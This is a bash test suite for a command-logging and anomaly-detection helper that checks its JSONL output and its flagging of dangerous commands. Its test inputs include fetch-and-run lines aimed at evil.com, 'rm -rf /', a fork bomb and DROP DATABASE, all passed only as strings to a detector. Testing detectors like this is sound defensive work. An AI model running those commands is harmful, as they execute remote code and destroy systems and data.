#!/usr/bin/env bash
# SPDX-License-Identifier: MIT
# SPDX-FileCopyrightText: 2025-2026 Marcus Quinn
# shellcheck disable=SC2034,SC2016

# =============================================================================
# Test Script for command-logger-helper.sh (t1412.5)
# =============================================================================
# Tests command logging to JSONL and anomalous pattern detection.
# Focuses on: logging format, JSON validity, pattern matching, stats, edge cases.
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)" || exit
HELPER="${SCRIPT_DIR}/../command-logger-helper.sh"

# Colors
readonly TEST_RED='\033[0;31m'
readonly TEST_GREEN='\033[0;32m'
readonly RESET='\033[0m'

# Test counters
TESTS_RUN=0
TESTS_PASSED=0
TESTS_FAILED=0

# Temp dir for test isolation
TEST_DIR=""

#######################################
# Print test result
# Arguments:
#   $1 - Test name
#   $2 - Result (0=pass, 1=fail)
#   $3 - Optional message
# Returns:
#   0 always
#######################################
print_result() {
	local test_name="$1"
	local result="$2"
	local message="${3:-}"

	TESTS_RUN=$((TESTS_RUN + 1))

	if [[ "$result" -eq 0 ]]; then
		echo -e "${TEST_GREEN}PASS${RESET} $test_name"
		TESTS_PASSED=$((TESTS_PASSED + 1))
	else
		echo -e "${TEST_RED}FAIL${RESET} $test_name"
		if [[ -n "$message" ]]; then
			echo "       $message"
		fi
		TESTS_FAILED=$((TESTS_FAILED + 1))
	fi
	return 0
}

#######################################
# Setup test environment
# Creates isolated temp directory for log files
# Returns:
#   0 on success
#######################################
setup() {
	TEST_DIR=$(mktemp -d)
	export COMMAND_LOG_DIR="$TEST_DIR"
	export COMMAND_LOG_FILE="$TEST_DIR/command-log.jsonl"
	return 0
}

#######################################
# Teardown test environment
# Removes temp directory
# Returns:
#   0 always
#######################################
teardown() {
	if [[ -n "$TEST_DIR" && -d "$TEST_DIR" ]]; then
		rm -rf "$TEST_DIR"
	fi
	return 0
}

# =============================================================================
# Logging Tests
# =============================================================================

test_log_creates_file() {
	setup
	local output
	output=$("$HELPER" log --cmd "git status" 2>&1)
	local result=$?

	if [[ $result -eq 0 && -f "$COMMAND_LOG_FILE" ]]; then
		print_result "log creates JSONL file" 0
	else
		print_result "log creates JSONL file" 1 "File not created or command failed (exit=$result)"
	fi
	teardown
	return 0
}

test_log_valid_json() {
	setup
	"$HELPER" log --cmd "echo hello" >/dev/null 2>&1

	local line
	line=$(head -1 "$COMMAND_LOG_FILE")

	# Check it's valid JSON (use python if jq not available)
	if command -v jq &>/dev/null; then
		if echo "$line" | jq . >/dev/null 2>&1; then
			print_result "log entry is valid JSON" 0
		else
			print_result "log entry is valid JSON" 1 "Invalid JSON: $line"
		fi
	elif command -v python3 &>/dev/null; then
		if echo "$line" | python3 -c "import sys,json; json.load(sys.stdin)" 2>/dev/null; then
			print_result "log entry is valid JSON" 0
		else
			print_result "log entry is valid JSON" 1 "Invalid JSON: $line"
		fi
	else
		# Fallback: basic structure check
		if echo "$line" | grep -q '"timestamp"' && echo "$line" | grep -q '"pid"' && echo "$line" | grep -q '"command"'; then
			print_result "log entry is valid JSON (basic check)" 0
		else
			print_result "log entry is valid JSON (basic check)" 1 "Missing fields: $line"
		fi
	fi
	teardown
	return 0
}

test_log_has_required_fields() {
	setup
	"$HELPER" log --cmd "ls -la" >/dev/null 2>&1

	local line
	line=$(head -1 "$COMMAND_LOG_FILE")

	local has_timestamp has_pid has_command
	has_timestamp=0
	has_pid=0
	has_command=0

	echo "$line" | grep -q '"timestamp"' && has_timestamp=1
	echo "$line" | grep -q '"pid"' && has_pid=1
	echo "$line" | grep -q '"command"' && has_command=1

	if [[ $has_timestamp -eq 1 && $has_pid -eq 1 && $has_command -eq 1 ]]; then
		print_result "log entry has timestamp, pid, command" 0
	else
		print_result "log entry has timestamp, pid, command" 1 \
			"timestamp=$has_timestamp pid=$has_pid command=$has_command in: $line"
	fi
	teardown
	return 0
}

test_log_preserves_command() {
	setup
	"$HELPER" log --cmd "git commit -m 'test message'" >/dev/null 2>&1

	local line
	line=$(head -1 "$COMMAND_LOG_FILE")

	if echo "$line" | grep -q "git commit -m"; then
		print_result "log preserves command content" 0
	else
		print_result "log preserves command content" 1 "Command not found in: $line"
	fi
	teardown
	return 0
}

test_log_multiple_commands() {
	setup
	"$HELPER" log --cmd "cmd1" >/dev/null 2>&1
	"$HELPER" log --cmd "cmd2" >/dev/null 2>&1
	"$HELPER" log --cmd "cmd3" >/dev/null 2>&1

	local count
	count=$(wc -l <"$COMMAND_LOG_FILE" | tr -d ' ')

	if [[ "$count" -eq 3 ]]; then
		print_result "multiple logs append correctly" 0
	else
		print_result "multiple logs append correctly" 1 "Expected 3 lines, got $count"
	fi
	teardown
	return 0
}

test_log_escapes_quotes() {
	setup
	"$HELPER" log --cmd 'echo "hello world"' >/dev/null 2>&1

	local line
	line=$(head -1 "$COMMAND_LOG_FILE")

	# The JSON should be valid even with quotes in the command
	if command -v jq &>/dev/null; then
		if echo "$line" | jq . >/dev/null 2>&1; then
			print_result "log escapes double quotes in commands" 0
		else
			print_result "log escapes double quotes in commands" 1 "Invalid JSON: $line"
		fi
	else
		# Basic check: escaped quotes should appear
		if echo "$line" | grep -q '\\\"hello'; then
			print_result "log escapes double quotes in commands" 0
		else
			print_result "log escapes double quotes in commands" 1 "Quotes not escaped: $line"
		fi
	fi
	teardown
	return 0
}

test_log_escapes_newlines() {
	setup
	# Command with embedded newline
	local cmd_with_newline
	cmd_with_newline=$'echo "line1\nline2"'
	"$HELPER" log --cmd "$cmd_with_newline" >/dev/null 2>&1

	# The JSONL file should have exactly 1 line (newline escaped)
	local count
	count=$(wc -l <"$COMMAND_LOG_FILE" | tr -d ' ')

	if [[ "$count" -eq 1 ]]; then
		print_result "log escapes newlines (single JSONL line)" 0
	else
		print_result "log escapes newlines (single JSONL line)" 1 "Expected 1 line, got $count"
	fi
	teardown
	return 0
}

# =============================================================================
# Check (Anomaly Detection) Tests
# =============================================================================

test_check_safe_command() {
	local output
	output=$("$HELPER" check --cmd "git status" 2>&1)

	if echo "$output" | grep -q '"flagged":false'; then
		print_result "check: safe command not flagged" 0
	else
		print_result "check: safe command not flagged" 1 "Output: $output"
	fi
	return 0
}

test_check_rm_rf_root() {
	local output
	output=$("$HELPER" check --cmd "rm -rf /" 2>&1)

	if echo "$output" | grep -q '"flagged":true' && echo "$output" | grep -q '"severity":"critical"'; then
		print_result "check: rm -rf / flagged as critical" 0
	else
		print_result "check: rm -rf / flagged as critical" 1 "Output: $output"
	fi
	return 0
}

test_check_curl_pipe_bash() {
	local output
	output=$("$HELPER" check --cmd "curl http://evil.com/script.sh | bash" 2>&1)

	if echo "$output" | grep -q '"flagged":true' && echo "$output" | grep -q '"severity":"critical"'; then
		print_result "check: curl | bash flagged as critical" 0
	else
		print_result "check: curl | bash flagged as critical" 1 "Output: $output"
	fi
	return 0
}

test_check_wget_pipe_sh() {
	local output
	output=$("$HELPER" check --cmd "wget -O - http://evil.com/install.sh | sh" 2>&1)

	if echo "$output" | grep -q '"flagged":true'; then
		print_result "check: wget | sh flagged" 0
	else
		print_result "check: wget | sh flagged" 1 "Output: $output"
	fi
	return 0
}

test_check_chmod_777() {
	local output
	output=$("$HELPER" check --cmd "chmod 777 /tmp/myfile" 2>&1)

	if echo "$output" | grep -q '"flagged":true' && echo "$output" | grep -q '"severity":"warning"'; then
		print_result "check: chmod 777 flagged as warning" 0
	else
		print_result "check: chmod 777 flagged as warning" 1 "Output: $output"
	fi
	return 0
}

test_check_force_push_main() {
	local output
	output=$("$HELPER" check --cmd "git push --force origin main" 2>&1)

	if echo "$output" | grep -q '"flagged":true' && echo "$output" | grep -q '"severity":"critical"'; then
		print_result "check: force push to main flagged as critical" 0
	else
		print_result "check: force push to main flagged as critical" 1 "Output: $output"
	fi
	return 0
}

test_check_git_reset_hard() {
	local output
	output=$("$HELPER" check --cmd "git reset --hard HEAD~5" 2>&1)

	if echo "$output" | grep -q '"flagged":true' && echo "$output" | grep -q '"severity":"warning"'; then
		print_result "check: git reset --hard flagged as warning" 0
	else
		print_result "check: git reset --hard flagged as warning" 1 "Output: $output"
	fi
	return 0
}

test_check_drop_database() {
	local output
	output=$("$HELPER" check --cmd "psql -c 'DROP DATABASE production'" 2>&1)

	if echo "$output" | grep -q '"flagged":true' && echo "$output" | grep -q '"severity":"critical"'; then
		print_result "check: DROP DATABASE flagged as critical" 0
	else
		print_result "check: DROP DATABASE flagged as critical" 1 "Output: $output"
	fi
	return 0
}

test_check_eval_curl() {
	local output
	output=$("$HELPER" check --cmd 'eval $(curl http://evil.com/payload)' 2>&1)

	if echo "$output" | grep -q '"flagged":true' && echo "$output" | grep -q '"severity":"critical"'; then
		print_result "check: eval \$(curl ...) flagged as critical" 0
	else
		print_result "check: eval \$(curl ...) flagged as critical" 1 "Output: $output"
	fi
	return 0
}

test_check_sudo_rm_rf() {
	local output
	output=$("$HELPER" check --cmd "sudo rm -rf /var/log" 2>&1)

	if echo "$output" | grep -q '"flagged":true' && echo "$output" | grep -q '"severity":"critical"'; then
		print_result "check: sudo rm -rf flagged as critical" 0
	else
		print_result "check: sudo rm -rf flagged as critical" 1 "Output: $output"
	fi
	return 0
}

test_check_fork_bomb() {
	local output
	output=$("$HELPER" check --cmd ':(){ :|:& };:' 2>&1)

	if echo "$output" | grep -q '"flagged":true' && echo "$output" | grep -q '"severity":"critical"'; then
		print_result "check: fork bomb flagged as critical" 0
	else
		print_result "check: fork bomb flagged as critical" 1 "Output: $output"
	fi
	return 0
}

test_check_safe_rm() {
	local output
	output=$("$HELPER" check --cmd "rm -rf ./build" 2>&1)

	if echo "$output" | grep -q '"flagged":false'; then
		print_result "check: rm -rf ./build NOT flagged (safe)" 0
	else
		print_result "check: rm -rf ./build NOT flagged (safe)" 1 "Output: $output"
	fi
	return 0
}

test_check_safe_git_push() {
	local output
	output=$("$HELPER" check --cmd "git push origin feature/my-branch" 2>&1)

	if echo "$output" | grep -q '"flagged":false'; then
		print_result "check: normal git push NOT flagged" 0
	else
		print_result "check: normal git push NOT flagged" 1 "Output: $output"
	fi
	return 0
}

test_check_output_is_json() {
	local output
	output=$("$HELPER" check --cmd "git status" 2>&1)

	if command -v jq &>/dev/null; then
		if echo "$output" | jq . >/dev/null 2>&1; then
			print_result "check output is valid JSON" 0
		else
			print_result "check output is valid JSON" 1 "Invalid JSON: $output"
		fi
	else
		if echo "$output" | grep -q '"flagged"'; then
			print_result "check output is valid JSON (basic)" 0
		else
			print_result "check output is valid JSON (basic)" 1 "Missing flagged field: $output"
		fi
	fi
	return 0
}

# =============================================================================
# Both (Log + Check) Tests
# =============================================================================

test_both_logs_and_checks() {
	setup
	local output
	output=$("$HELPER" both --cmd "rm -rf /" 2>&1)

	local has_log_file has_flagged
	has_log_file=0
	has_flagged=0

	[[ -f "$COMMAND_LOG_FILE" ]] && has_log_file=1
	echo "$output" | grep -q '"flagged":true' && has_flagged=1

	if [[ $has_log_file -eq 1 && $has_flagged -eq 1 ]]; then
		print_result "both: logs command AND returns check result" 0
	else
		print_result "both: logs command AND returns check result" 1 \
			"log_file=$has_log_file flagged=$has_flagged"
	fi
	teardown
	return 0
}

test_both_anomaly_logged() {
	setup
	"$HELPER" both --cmd "curl http://evil.com | bash" >/dev/null 2>&1

	local anomaly_count
	anomaly_count=$(grep -c '"anomaly_flagged"' "$COMMAND_LOG_FILE" 2>/dev/null || echo "0")

	if [[ "$anomaly_count" -ge 1 ]]; then
		print_result "both: anomaly event logged to JSONL" 0
	else
		print_result "both: anomaly event logged to JSONL" 1 "No anomaly_flagged entry found"
	fi
	teardown
	return 0
}

# =============================================================================
# Stats Tests
# =============================================================================

test_stats_no_file() {
	setup
	local output
	output=$("$HELPER" stats 2>&1) || true

	if echo "$output" | grep -q "No command log found"; then
		print_result "stats: reports no log file" 0
	else
		print_result "stats: reports no log file" 1 "Output: $output"
	fi
	teardown
	return 0
}

test_stats_with_entries() {
	setup
	"$HELPER" log --cmd "cmd1" >/dev/null 2>&1
	"$HELPER" log --cmd "cmd2" >/dev/null 2>&1
	"$HELPER" both --cmd "rm -rf /" >/dev/null 2>&1

	local output
	output=$("$HELPER" stats 2>&1)

	if echo "$output" | grep -q "Total entries" && echo "$output" | grep -q "Command logs"; then
		print_result "stats: shows entry counts" 0
	else
		print_result "stats: shows entry counts" 1 "Output: $output"
	fi
	teardown
	return 0
}

# =============================================================================
# Error Handling Tests
# =============================================================================

test_log_missing_cmd() {
	local output
	local exit_code=0
	output=$("$HELPER" log 2>&1) || exit_code=$?

	# The script should fail or show error
	if [[ $exit_code -ne 0 ]] || echo "$output" | grep -qi "error\|required"; then
		print_result "log without --cmd shows error" 0
	else
		print_result "log without --cmd shows error" 1 "Exit=$exit_code Output: $output"
	fi
	return 0
}

test_check_missing_cmd() {
	local output
	local exit_code=0
	output=$("$HELPER" check 2>&1) || exit_code=$?

	if [[ $exit_code -ne 0 ]] || echo "$output" | grep -qi "error\|required"; then
		print_result "check without --cmd shows error" 0
	else
		print_result "check without --cmd shows error" 1 "Exit=$exit_code Output: $output"
	fi
	return 0
}

test_help_output() {
	local output
	output=$("$HELPER" help 2>&1)

	if echo "$output" | grep -q "Usage" && echo "$output" | grep -q "Commands"; then
		print_result "help shows usage information" 0
	else
		print_result "help shows usage information" 1 "Output: $output"
	fi
	return 0
}

test_unknown_command() {
	local output
	local exit_code=0
	output=$("$HELPER" nonexistent 2>&1) || exit_code=$?

	if [[ $exit_code -ne 0 ]]; then
		print_result "unknown command returns non-zero exit" 0
	else
		print_result "unknown command returns non-zero exit" 1 "Exit=$exit_code"
	fi
	return 0
}

# =============================================================================
# Edge Case Tests
# =============================================================================

test_log_empty_command() {
	setup
	local output
	local exit_code=0
	output=$("$HELPER" log --cmd "" 2>&1) || exit_code=$?

	# Empty command should be rejected with an error
	if [[ $exit_code -ne 0 ]] && echo "$output" | grep -qi "error\|required"; then
		print_result "log rejects empty command string" 0
	else
		print_result "log rejects empty command string" 1 "Exit=$exit_code Output: $output"
	fi
	teardown
	return 0
}

test_log_special_characters() {
	setup
	"$HELPER" log --cmd 'echo $HOME && cat /etc/passwd | grep "root" > /tmp/out' >/dev/null 2>&1

	local line
	line=$(head -1 "$COMMAND_LOG_FILE")

	if command -v jq &>/dev/null; then
		if echo "$line" | jq . >/dev/null 2>&1; then
			print_result "log handles special characters in commands" 0
		else
			print_result "log handles special characters in commands" 1 "Invalid JSON: $line"
		fi
	else
		if echo "$line" | grep -q '"command"'; then
			print_result "log handles special characters in commands" 0
		else
			print_result "log handles special characters in commands" 1 "Missing command field"
		fi
	fi
	teardown
	return 0
}

test_check_case_insensitive() {
	local output
	output=$("$HELPER" check --cmd "DROP database production" 2>&1)

	if echo "$output" | grep -q '"flagged":true'; then
		print_result "check: case-insensitive pattern matching" 0
	else
		print_result "check: case-insensitive pattern matching" 1 "Output: $output"
	fi
	return 0
}

# =============================================================================
# Run All Tests
# =============================================================================

main() {
	echo "============================================="
	echo "  command-logger-helper.sh Test Suite"
	echo "============================================="
	echo ""

	echo "--- Logging Tests ---"
	test_log_creates_file
	test_log_valid_json
	test_log_has_required_fields
	test_log_preserves_command
	test_log_multiple_commands
	test_log_escapes_quotes
	test_log_escapes_newlines

	echo ""
	echo "--- Check (Anomaly Detection) Tests ---"
	test_check_safe_command
	test_check_rm_rf_root
	test_check_curl_pipe_bash
	test_check_wget_pipe_sh
	test_check_chmod_777
	test_check_force_push_main
	test_check_git_reset_hard
	test_check_drop_database
	test_check_eval_curl
	test_check_sudo_rm_rf
	test_check_fork_bomb
	test_check_safe_rm
	test_check_safe_git_push
	test_check_output_is_json

	echo ""
	echo "--- Both (Log + Check) Tests ---"
	test_both_logs_and_checks
	test_both_anomaly_logged

	echo ""
	echo "--- Stats Tests ---"
	test_stats_no_file
	test_stats_with_entries

	echo ""
	echo "--- Error Handling Tests ---"
	test_log_missing_cmd
	test_check_missing_cmd
	test_help_output
	test_unknown_command

	echo ""
	echo "--- Edge Case Tests ---"
	test_log_empty_command
	test_log_special_characters
	test_check_case_insensitive

	echo ""
	echo "============================================="
	echo "  Results: $TESTS_PASSED/$TESTS_RUN passed, $TESTS_FAILED failed"
	echo "============================================="

	if [[ $TESTS_FAILED -gt 0 ]]; then
		exit 1
	fi
	return 0
}

main "$@"
